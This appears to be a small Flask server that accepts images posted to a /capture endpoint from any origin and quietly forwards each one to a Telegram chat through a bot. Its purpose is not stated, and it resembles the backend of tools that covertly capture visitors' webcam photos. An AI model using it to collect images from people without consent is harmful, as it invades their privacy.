from flask import Flask, request
from flask_cors import CORS
import threading
import requests
import os

app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.environ["BOT_TOKEN"]
CHAT_ID = os.environ["CHAT_ID"]

TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"

def send_photo_async(image_bytes):
    files = {
        "photo": image_bytes
    }
    data = {
        "chat_id": CHAT_ID
    }
    requests.post(TELEGRAM_URL, data=data, files=files, timeout=10)

@app.route("/capture", methods=["POST"])
def capture():
    image = request.files["image"]
    img_bytes = image.read()

    threading.Thread(
        target=send_photo_async,
        args=(img_bytes,)
    ).start()

    return "OK", 200
